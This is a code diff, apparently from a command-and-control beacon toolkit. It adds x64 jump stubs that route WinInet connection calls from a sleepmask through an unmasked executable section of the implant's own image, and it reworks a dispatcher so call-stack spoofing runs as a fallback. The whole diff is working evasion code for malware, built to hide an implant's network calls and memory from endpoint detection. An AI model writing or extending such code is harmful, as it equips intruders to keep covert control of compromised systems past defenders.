@@ -70,6 +70,30 @@ void gate_spoof_recovery(void);                     /* asm PROC - bare symbol */
 extern "C" const char gate_spoof_probe_tag[] = "gate: spoof exec fn=";
 extern "C" void gate_spoof_probe(unsigned long long fn);
 
+#if defined(_M_X64)
+/* gate_tramp.asm, assembled for every x64 build: two 16-byte
+ * `jmp qword ptr [rip+2]` stubs, the API slot at +8 of each */
+extern "C" unsigned char gated_comms[];
+#define GATE_COMMS_STRIDE 16
+
+/* WinInet resolves its caller by return address and wants it inside an
+ * image mapping (see gate_tramp.asm). A user sleepmask runs the call
+ * from its own memory, so the two comms calls it is handed point here
+ * instead - an executable section of ours the kit's masks leave alone
+ * (beacon_info_fill: MaskSection FALSE) - and jump on to the real API. */
+static void * gate_comms_stub(int api, void * fn)
+{
+	unsigned char * stub = gated_comms + GATE_COMMS_STRIDE * api;
+
+	if (api != GATE_API_INTERNETOPENA && api != GATE_API_INTERNETCONNECTA)
+		return fn;
+	if (stub[0] != 0xFF || stub[1] != 0x25)
+		return fn;
+	*(void **)(stub + 8) = fn;
+	return stub;
+}
+#endif
+
 static unsigned char *  g_gate_page;
 static unsigned long long g_gate_pivot;
 static unsigned long long g_gate_gadget;
@@ -373,11 +397,19 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 	fc->bMask = fc->bMask && gate_mask_allowed(fc->function);
 
 	if (g_gate_executor != NULL) {
-		g_gate_executor(fc);
-		done = 1;
+#if defined(_M_X64)
+		/* the comms calls enter the API through our own image */
+		void * fn = fc->functionPtr;
+		fc->functionPtr = gate_comms_stub(fc->function, fn);
+		done = g_gate_executor(fc);
+		fc->functionPtr = fn;
+#else
+		done = g_gate_executor(fc);
+#endif
+		KD(done ? "gate: executor ran api=" : "gate: executor declined api=", fc->function);
 	}
 #if defined(_M_X64)
-	else {
+	if (!done) {
 		GATE_SPOOFCTX ctx;
 		int i;
 
